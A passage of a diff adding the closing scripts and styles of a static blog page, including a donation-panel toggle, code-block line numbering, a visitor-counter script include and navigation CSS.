+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
